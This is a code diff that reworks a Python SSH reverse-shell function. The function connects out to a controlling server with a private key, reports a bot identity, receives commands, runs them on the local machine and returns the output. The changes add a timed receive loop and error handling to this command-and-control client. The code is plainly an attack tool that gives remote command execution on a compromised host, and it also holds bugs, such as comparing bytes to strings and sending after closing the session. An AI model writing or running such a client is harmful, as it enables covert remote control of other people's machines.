@@ -86,79 +86,91 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
     global ssh_client, ssh_session, timeout
     ssh_client = paramiko.SSHClient()
 
-    # Load host keys if available, or use AutoAddPolicy to add new ones
-    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        # Load host keys if available, or use AutoAddPolicy to add new ones
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    # Load the private key from a file
-    private_key = paramiko.RSAKey.from_private_key_file(key_file)
-    
-    # Connect to the SSH server using the private key
-    ssh_client.connect(ip, username=user, pkey=private_key, port=port)
-
-    # Open a session and execute the command
-    ssh_session = ssh_client.get_transport().open_session()
+        # Load the private key from a file
+        private_key = paramiko.RSAKey.from_private_key_file(key_file)
         
-    server_instructions = None
+        # Connect to the SSH server using the private key
+        ssh_client.connect(ip, username=user, pkey=private_key, port=port)
 
-    #while server_instructions != "kill":
-    if ssh_session.active:
-        print("[!] Sending identity!")
-        ssh_session.send(bot_user.encode())
+        # Open a session and execute the command
+        ssh_session = ssh_client.get_transport().open_session()
+            
+        server_instructions = None
 
-        # Start the timeout thread
-        timeout = False  # Reset the timeout flag
-        timeout_thread = threading.Thread(target=max_timeout, args=(5,))
-        timeout_thread.daemon = True  # Ensure the thread exits with the program
-        timeout_thread.start()
+        #while server_instructions != "kill":
+        if ssh_session.active:
+            print("[!] Sending identity!")
+            ssh_session.send(bot_user.encode())
 
-        print("[!] Listening for instructions ...")
-        server_instructions = ssh_session.recv(1024).decode().strip()
-        server_instructions = server_instructions.encode()
+            # Start the timeout thread
+            timeout = False  # Reset the timeout flag
+            timeout_thread = threading.Thread(target=max_timeout, args=(5,))
+            timeout_thread.daemon = True  # Ensure the thread exits with the program
+            timeout_thread.start()
 
-        if timeout == True:
-            timeout = False
+            print("[!] Listening for instructions ...")
+            while not timeout:
+                try:
+                    ssh_session.settimeout(1.0)
+                    server_instructions = ssh_session.recv(1024).decode().strip()
+                    server_instructions = server_instructions.encode()
+
+                    if server_instructions:
+                        print(f"[!] Received command: {server_instructions}")
+
+                        # Handle termination command
+                        if server_instructions == 'kill':
+                            print("[!] Session terminated by the server!")
+                            exit_gracefully()
+                        if server_instructions == 'exit':
+                            print("[*] Session finished by the server. Continuing to next loop.")
+                            ssh_session.close()
+                            ssh_client.close()
+                            return
+
+                        # Execute command on the channel and capture output
+                        print("Trying to execute the command")
+                        try:
+                            response = exec_underlying_command(server_instructions)
+                        except Exception as e:
+                            response = f"Command failed:\t{e}"
+
+                        ssh_session.send(response.encode())
+
+                        print("[!] Response sent!")
+
+                        #server_instructions = "kill"
+                        ssh_session.close()
+                        ssh_client.close()
+                        return
+
+                except Exception as e:
+                    print(Colors.RED + f"[*] Error: {e}" + Colors.R)
+                    pass
+
+
             ssh_session.close()
             ssh_client.close()
-
             response = f"Timeout while listening new instructions!"
             ssh_session.send(response.encode())
             print("[!] Response sent!")
 
-            return
+            return response
 
-        if server_instructions:
-            print(f"[!] Received command: {server_instructions}")
+                
+        time.sleep(1)
 
-            # Handle termination command
-            if server_instructions == 'kill':
-                print("[!] Session terminated by the server!")
-                exit_gracefully()
-            if server_instructions == 'exit':
-                print("[*] Session finished by the server. Continuing to next loop.")
-                ssh_session.close()
-                ssh_client.close()
-                return
-
-
-
-            # Execute command on the channel and capture output
-            print("Trying to execute the command")
-            try:
-                response = exec_underlying_command(server_instructions)
-            except Exception as e:
-                response = f"Command failed:\t{e}"
-
-            ssh_session.send(response.encode())
-
-            print("[!] Response sent!")
-
-
-            #server_instructions = "kill"
+    except Exception as e:
+        print(f"[!] Error occurred: {e}")
+        if ssh_session:
             ssh_session.close()
+        if ssh_client:
             ssh_client.close()
-            return
-            
-    time.sleep(1)
+        return f"Error: {e}"
 
 
 if __name__ == "__main__":
